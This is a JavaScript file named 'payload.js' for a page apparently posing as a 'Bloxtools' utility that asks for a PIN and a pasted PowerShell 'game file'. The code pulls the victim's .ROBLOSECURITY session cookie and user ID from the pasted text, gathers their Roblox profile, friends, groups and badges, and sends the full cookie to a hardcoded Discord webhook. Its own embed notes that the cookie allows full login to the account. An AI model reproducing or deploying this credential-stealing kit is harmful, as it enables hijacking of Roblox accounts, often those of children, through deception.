/* ======================================================
   PAYLOAD.JS - IMPROVED CORS HANDLING
   - Multiple CORS proxy fallbacks (AllOrigins, CorsProxy, etc.)
   - Reliable Roblox API fetching with retries & timeouts
   - Extracts rbxuid & .ROBLOSECURITY cookie from PowerShell text
   - Fetches complete user profile, friends, followers, groups, badges, avatar
   - Sends rich Discord webhook with full data
   - Fixed reversed status messages & enhanced error handling
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

// List of reliable CORS proxies (tried in order)
const CORS_PROXIES = [
    "https://api.allorigins.win/raw?url=",
    "https://corsproxy.io/?",
    "https://cors-anywhere.herokuapp.com/"
];

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation (4 digits only)
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract cookie and rbxuid from PowerShell game file dump
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Fetch JSON from Roblox API using multiple CORS proxies with retry logic
async function fetchRobloxAPI(endpoint, retries = 2) {
    if (!endpoint.startsWith("http")) {
        endpoint = "https://" + endpoint;
    }

    for (let attempt = 0; attempt <= retries; attempt++) {
        for (const proxy of CORS_PROXIES) {
            try {
                const proxyUrl = `${proxy}${encodeURIComponent(endpoint)}`;
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 8000);

                const response = await fetch(proxyUrl, {
                    signal: controller.signal,
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "application/json"
                    }
                });
                clearTimeout(timeoutId);

                if (!response.ok) continue;

                const text = await response.text();
                // Attempt to parse JSON
                const data = JSON.parse(text);
                return data;
            } catch (err) {
                // ignore and try next proxy / retry
                console.warn(`Proxy ${proxy} failed for ${endpoint}:`, err.message);
            }
        }
        // Small delay before retry
        if (attempt < retries) await new Promise(r => setTimeout(r, 500));
    }
    return null;
}

// --- User Info ---
async function fetchUserInfo(userId) {
    const data = await fetchRobloxAPI(`https://users.roblox.com/v1/users/${userId}`);
    if (!data || !data.name) return null;
    return {
        username: data.name,
        displayName: data.displayName || data.name,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

// --- Friends Count ---
async function fetchFriendsCount(userId) {
    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || "Unavailable";
}

// --- Followers Count (total) ---
async function fetchFollowersCount(userId) {
    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    // API returns "total" property for total followers
    return data?.total?.toLocaleString() || "Unavailable";
}

// --- Groups (first 5) ---
async function fetchGroups(userId) {
    const data = await fetchRobloxAPI(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!data || !data.data || data.data.length === 0) return [];
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

// --- Badges (first 5) ---
async function fetchBadges(userId) {
    const data = await fetchRobloxAPI(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!data || !data.data || data.data.length === 0) return [];
    return data.data.map(b => b.badge.name);
}

// --- Avatar items (first 5 equipped) ---
async function fetchAvatarItems(userId) {
    const data = await fetchRobloxAPI(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!data || !data.assets || data.assets.length === 0) return "None equipped";
    const items = data.assets.slice(0, 5).map(a => a.name);
    return items.join(", ") + (data.assets.length > 5 ? " …" : "");
}

// --- Avatar thumbnail URL ---
async function fetchAvatarThumbnail(userId) {
    const data = await fetchRobloxAPI(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Robux balance is not possible via CORS without sending cookie header - show note instead
async function fetchRobuxBalance() {
    return "N/A (requires cookie auth)";
}

// --- Send everything to Discord webhook ---
async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    statusMessage.textContent = "⏳ Fetching profile data (may take 10-15 seconds)...";
    
    // Fetch all data in parallel
    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl] = await Promise.all([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchAvatarItems(userId),
        fetchAvatarThumbnail(userId)
    ]);

    let description = `**Extracted from PowerShell:**\n- **User ID (rbxuid):** \`${userId}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
    } else {
        embedFields.push({ name: "⚠️ Profile Error", value: "Could not fetch user info (API may be down or rate-limited).", inline: false });
    }

    embedFields.push(
        { name: "👥 Friends", value: friendsCount, inline: true },
        { name: "👀 Followers", value: followersCount, inline: true },
        { name: "💰 Robux", value: await fetchRobuxBalance(), inline: true },
        { name: "👕 Wearing", value: avatarItems, inline: false }
    );

    if (groups.length > 0) embedFields.push({ name: "🏢 Groups (first 5)", value: groups.join("\n"), inline: false });
    if (badges.length > 0) embedFields.push({ name: "🏅 Badges (first 5)", value: badges.join("\n"), inline: false });

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**Note:** This cookie can be used to fully log into the account.`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 Roblox Profile Extraction",
            thumbnail: { url: avatarUrl },
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Complete Profile • CORS Proxy Enhanced" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (err) {
        console.error("Webhook send failed:", err);
        return false;
    }
}

// --- Main copy button handler ---
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Processing and fetching profile data...";
    statusMessage.style.color = "#caa8ff";

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    if (success) {
        statusMessage.textContent = "✅ Profile data successfully sent to Discord webhook!";
        statusMessage.style.color = "#b5ffb5";
    } else {
        statusMessage.textContent = "❌ Failed to send webhook. Check your internet connection or Discord webhook URL.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
